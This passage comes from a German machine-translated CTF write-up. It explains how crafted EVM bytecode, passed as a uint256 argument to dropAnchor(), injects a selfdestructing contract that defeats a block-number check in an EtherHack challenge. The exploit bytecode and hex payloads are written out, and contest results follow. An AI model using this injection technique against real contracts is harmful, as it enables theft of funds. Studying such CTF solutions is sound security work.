Dabei sind die fettgedruckten Bytes der Code des gehosteten Vertrags und 414141 die Injektionsstelle.  Da wir vor der Aufgabe stehen, den Wurfoperator loszuwerden, müssen wir unseren neuen Vertrag einfügen und den nachfolgenden Teil des Initialisierungscodes neu schreiben.  Versuchen wir, den Vertrag mit der Anweisung 0xff zu versehen, was zur bedingungslosen Entfernung des Ankervertrags mit <code>selfdestruct()</code> : <br><br><pre>  68 414141ff3f3f3f3f3f ;;  push9 Vertrag
 60 00 ;;  push1 0
 52 ;;  mstore
 60 09 ;;  push1 9
 60 17 ;;  push1 17
 f3 ;;  zurück </pre><br>  Wenn wir diese Folge von Bytes in <code>uint256 (9081882833248973872855737642440582850680819)</code> und als Argument für die Funktion <code>dropAnchor()</code> verwenden, erhalten wir den folgenden Wert für die <code>dropAnchor()</code> (der fettgedruckte Bytecode ist unsere Nutzlast): <br><br><pre> <code class="cpp hljs"><span class="hljs-number"><span class="hljs-number">0x630068414141ff3f3f3f3f3f60005260096017f34310585733ff</span></span></code> </pre> <br>  Nachdem die Codevariable Teil der Initcodevariablen geworden ist, erhalten wir den folgenden Wert: <br><br><pre> <code class="cpp hljs"><span class="hljs-number"><span class="hljs-number">0x68414141ff3f3f3f3f3f60005260096017f34310585733ff600052600b6015f3</span></span></code> </pre> <br>  Jetzt sind die High-Bytes <code>0x6300</code> weg und der Rest des Bytecodes wird nach <code>0xf3 (return)</code> verworfen. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/433/f75/735/433f757356003d73286fa4709cdedcfd.png" alt="Bild"><br><br>  Als Ergebnis wird ein neuer Vertrag mit der geänderten Logik erstellt: <br><br><pre>  41 ;;  Münzbasis
 41 ;;  Münzbasis
 41 ;;  Münzbasis
 ff ;;  Selbstzerstörung
 3f ;;  Müll
 3f ;;  Müll
 3f ;;  Müll
 3f ;;  Müll
 3f ;;  Müll </pre><br>  Wenn wir jetzt die Funktion pullAnchor () aufrufen, wird dieser Vertrag sofort zerstört, da block.number nicht mehr überprüft wird.  Danach rufen wir die Funktion sailAway () auf und feiern den Sieg! <br><br><h2>  Ergebnisse </h2><br><ol><li>  Erster Platz und Ausstrahlung in Höhe von 1.000 US-Dollar: Alexey Pertsev (p4lex) </li><li>  Zweiter Platz und Ledger Nano S: Alexey Markov </li><li>  Dritter Platz und PHDays Souvenirs: Alexander Vlasov </li></ol><br>  Alle Ergebnisse: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">etherhack.positive.com/#/scoreboard</a> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d88/d86/955/d88d8695572199f7e3d800f34deb18ee.jpg" alt="Bild"><br><br>  Herzlichen Glückwunsch an die Gewinner und vielen Dank an alle Teilnehmer! <br><br>  PS Vielen Dank an <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Zeppelin</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">, der den</a> Quellcode der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Ethernaut CTF-</a> Plattform Open Source gemacht hat. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de414959/">https://habr.com/ru/post/de414959/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de414945/index.html">Die Johns Hopkins University hat künstliche Haut geschaffen, die Schmerzen empfindet</a></li>
<li><a href="../de414947/index.html">Git für Windows unter ReactOS herunterladen</a></li>
<li><a href="../de414951/index.html">Zugriffsverwaltung in Expressjs mit CASL</a></li>
<li><a href="../de414953/index.html">Nvidia brachte dem neuronalen Netzwerk bei, das Video zu verlangsamen</a></li>
<li><a href="../de414955/index.html">Unternehmen verwendeten das Wort Blockchain, um die Kapitalisierung zu erhöhen. Hat eine Weile geholfen</a></li>
<li><a href="../de414961/index.html">Übersicht über SERM</a></li>
<li><a href="../de414963/index.html">Es wurde eine Problemumgehung für die Umgehung des Kennwortschutzes auf dem iPhone / iPad gefunden. Nicht wirklich</a></li>
<li><a href="../de414965/index.html">„Urheberrechtsschutz in der EU“: Neue Reformen können nicht nur Medienplattformen betreffen</a></li>
<li><a href="../de414967/index.html">So reduzieren Sie die Erstellungszeit eines Projekts mithilfe des Firebase Performance Plugins</a></li>
<li><a href="../de414969/index.html">Erweitern des Erstellungsprozesses mit MSBuild</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>